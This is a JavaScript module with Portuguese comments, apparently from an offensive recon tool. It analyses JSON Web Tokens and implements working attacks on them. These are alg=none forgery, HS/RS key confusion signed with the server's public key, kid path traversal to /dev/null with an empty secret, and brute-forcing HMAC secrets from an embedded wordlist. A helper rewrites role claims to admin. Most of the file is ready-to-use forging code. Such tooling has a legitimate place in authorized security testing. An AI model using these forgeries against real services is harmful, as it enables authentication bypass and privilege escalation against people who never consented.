/**
 * JWT lab — análise estática + ataques canônicos:
 *   - alg=none
 *   - alg confusion HS↔RS (firma HS256 com a chave pública RS256 do servidor)
 *   - kid traversal / SQLi
 *   - secret bruteforce com wordlist embutida (só para HS256/HS384/HS512)
 *
 * Tudo offline. Para enviar tokens forjados a um endpoint, caller usa o
 * próprio HTTP transport do GHOSTRECON.
 */

import crypto from 'node:crypto';

const COMMON_SECRETS = [
  'secret', 'jwt', 'jwt_secret', 'JWT_SECRET', 'changeme', 'password',
  '123456', 'admin', 'test', 'token', 'mysecret', 'super-secret',
  'your-256-bit-secret', 'demo', 'development', 'staging',
  'qwerty', 'letmein', 'P@ssw0rd', 'default',
];

function b64urlDecode(s) {
  s = String(s || '').replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64');
}

function b64urlEncode(buf) {
  return Buffer.from(buf).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}

export function decodeJwt(token) {
  if (!token || typeof token !== 'string') return null;
  const parts = token.split('.');
  if (parts.length < 2) return null;
  try {
    const header = JSON.parse(b64urlDecode(parts[0]).toString('utf8'));
    const payload = JSON.parse(b64urlDecode(parts[1]).toString('utf8'));
    const sig = parts.length >= 3 ? parts[2] : null;
    return { header, payload, signature: sig, raw: token };
  } catch { return null; }
}

export function analyzeJwt(token) {
  const d = decodeJwt(token);
  if (!d) return { ok: false, reason: 'parse-failed' };
  const { header, payload } = d;
  const findings = [];
  if (!header.alg || /^none$/i.test(header.alg)) {
    findings.push({ severity: 'critical', issue: 'alg-none', detail: `header.alg=${JSON.stringify(header.alg)}` });
  }
  if (header.alg && /^HS/i.test(header.alg)) {
    findings.push({ severity: 'medium', issue: 'symmetric-alg', detail: `${header.alg} — verificar bruteforce de secret` });
  }
  if (header.kid) {
    findings.push({ severity: 'low', issue: 'has-kid', detail: `kid=${header.kid} — testar traversal/SQLi/file-read` });
  }
  if (header.jku || header.x5u) {
    findings.push({ severity: 'high', issue: 'remote-key-url', detail: `header aponta para JWK/cert remota — possível injeção` });
  }
  if (payload.exp && Number(payload.exp) < Math.floor(Date.now() / 1000)) {
    findings.push({ severity: 'info', issue: 'expired', detail: `exp=${payload.exp}` });
  }
  if (!payload.exp && !payload.nbf) {
    findings.push({ severity: 'low', issue: 'no-expiration', detail: 'sem exp/nbf — token "eterno"' });
  }
  if (payload.iss && /localhost|127\.0\.0\.1|test|dev/i.test(payload.iss)) {
    findings.push({ severity: 'medium', issue: 'dev-issuer', detail: `iss=${payload.iss}` });
  }
  return { ok: true, header, payload, findings };
}

/**
 * Forja token com alg=none.
 */
export function forgeAlgNone(originalToken, claimMutator = (c) => c) {
  const d = decodeJwt(originalToken);
  if (!d) throw new Error('forgeAlgNone: token inválido');
  const header = { ...d.header, alg: 'none' };
  const payload = claimMutator({ ...d.payload });
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  return `${h}.${p}.`;
}

/**
 * HS256 confusion: assina o token usando a chave pública RSA como secret HMAC.
 * publicKeyPem deve ser a chave pública do servidor (jwks ou /.well-known).
 */
export function forgeHsConfusion(originalToken, publicKeyPem, claimMutator = (c) => c) {
  const d = decodeJwt(originalToken);
  if (!d) throw new Error('forgeHsConfusion: token inválido');
  const header = { ...d.header, alg: 'HS256' };
  const payload = claimMutator({ ...d.payload });
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = crypto.createHmac('sha256', publicKeyPem).update(`${h}.${p}`).digest();
  return `${h}.${p}.${b64urlEncode(sig)}`;
}

/**
 * Forja com kid traversal (ex: kid="../../../../dev/null") — alguns servers
 * aceitam essa key vazia e validam contra "" como secret.
 */
export function forgeKidTraversal(originalToken, kidPath = '../../../../../../dev/null', secret = '', claimMutator = (c) => c) {
  const d = decodeJwt(originalToken);
  if (!d) throw new Error('forgeKidTraversal: token inválido');
  const header = { ...d.header, alg: 'HS256', kid: kidPath };
  const payload = claimMutator({ ...d.payload });
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest();
  return `${h}.${p}.${b64urlEncode(sig)}`;
}

/**
 * Bruteforce de secret HS256/HS384/HS512 contra wordlist.
 * Retorna { found, secret } ou { found: false, attempts }.
 */
export function bruteforceSecret(token, { wordlist = COMMON_SECRETS, max = 10000 } = {}) {
  const d = decodeJwt(token);
  if (!d || !d.signature) return { found: false, reason: 'no-signature' };
  const alg = (d.header.alg || '').toUpperCase();
  const map = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
  const hashAlg = map[alg];
  if (!hashAlg) return { found: false, reason: `alg-not-symmetric: ${alg}` };
  const [h, p] = token.split('.');
  const expected = b64urlDecode(d.signature);
  let attempts = 0;
  for (const secret of wordlist) {
    if (attempts++ >= max) break;
    const sig = crypto.createHmac(hashAlg, secret).update(`${h}.${p}`).digest();
    if (sig.equals(expected)) return { found: true, secret, attempts };
  }
  return { found: false, attempts };
}

/**
 * Helper: muta claim "role" para admin (caso comum de teste).
 */
export function adminPromoter(claims) {
  const out = { ...claims };
  if ('role' in out) out.role = 'admin';
  if ('roles' in out && Array.isArray(out.roles)) out.roles = ['admin', ...out.roles];
  if ('isAdmin' in out) out.isAdmin = true;
  if ('admin' in out) out.admin = true;
  if ('scope' in out && typeof out.scope === 'string') out.scope = `${out.scope} admin`;
  return out;
}
